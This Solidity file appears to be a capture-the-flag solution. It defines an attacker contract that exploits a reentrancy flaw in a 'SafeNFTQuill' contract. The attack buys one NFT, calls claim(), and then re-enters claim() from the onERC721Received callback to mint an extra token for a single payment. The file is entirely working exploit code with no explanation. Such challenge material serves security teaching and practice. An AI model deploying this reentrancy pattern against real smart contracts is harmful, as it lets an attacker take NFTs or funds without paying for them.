// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.7;

import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
import "./SafeNFT.sol";

contract safeNFTQuillAttack is IERC721Receiver {
    SafeNFTQuill public targetContract;
    bool public flag;

    function attack(address payable target) public payable {
        targetContract = SafeNFTQuill(target);
        targetContract.buyNFT{value: msg.value}();
        targetContract.claim();
    }

    function onERC721Received(
        address /*operator*/,
        address /*from*/,
        uint256 /*tokenId*/,
        bytes calldata /*data*/
    ) external override returns (bytes4) {
        if (flag == false) {
            flag = true;
            targetContract.claim();
        }
        return IERC721Receiver.onERC721Received.selector;
    }
}